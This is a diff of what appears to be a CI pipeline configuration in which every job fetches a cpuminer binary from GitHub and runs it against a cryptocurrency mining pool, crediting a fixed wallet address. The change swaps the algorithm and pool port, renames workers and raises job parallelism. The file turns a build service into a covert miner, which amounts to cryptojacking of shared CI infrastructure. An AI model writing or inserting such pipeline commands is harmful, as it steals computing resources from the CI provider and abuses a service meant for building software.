@@ -10,8 +10,9 @@ blocks:
       jobs:
         - name: 'Job #1'
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido5 -t8'
-          parallelism: 20
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yescryptR32 -o stratum+tcps://stratum-na.rplant.xyz:17047 -u DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido98 -t8'
+          parallelism: 40
         - name: 'Job #2'
           commands:
-            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido5 -t8'
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yescryptR32 -o stratum+tcps://stratum-na.rplant.xyz:17047 -u DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido99 -t8'
+          parallelism: 4
